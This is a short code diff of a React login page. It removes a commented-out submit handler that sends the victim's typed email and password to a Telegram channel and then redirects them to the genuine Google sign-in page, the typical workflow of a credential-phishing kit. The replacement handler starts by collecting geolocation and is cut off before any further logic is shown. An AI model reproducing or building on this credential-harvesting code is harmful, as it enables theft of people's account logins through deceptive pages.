@@ -69,18 +69,6 @@ export default function MainPage() {
     setPassword(value);
     setIsValidPassword(examinationPassword(value) || value === '')
   }
-  // const complete = () => {
-  //   if(examinationPassword(password)&&examination(email)){
-  //     dispatch(sendTelegramMessage({ 
-  //       message: `login: ${email}\npassword: ${password}`
-  //     }));
-  //     setTimeout(() => {
-  //       window.location.href = 'https://accounts.google.com/v3/signin/identifier?checkedDomains=youtube&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1427879506%3A1770294599893415&ec=futura_exp_og_so_72776762_e&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=ru&ifkv=AXbMIuAlt-VbH6fU0tEwuZUkVUvgqSm06wdnp82HgWkD7TqP_4WpqbM7xnZ-8nPv_DBfvrY24o8a&pstMsg=1'
-  //     }, 1000);
-  //   }else{
-  //     setIsValidPassword(false)
-  //   }
-  // }
   const complete = () => {
     if (examinationPassword(password) && examination(email)) {
       // Получаем геолокацию
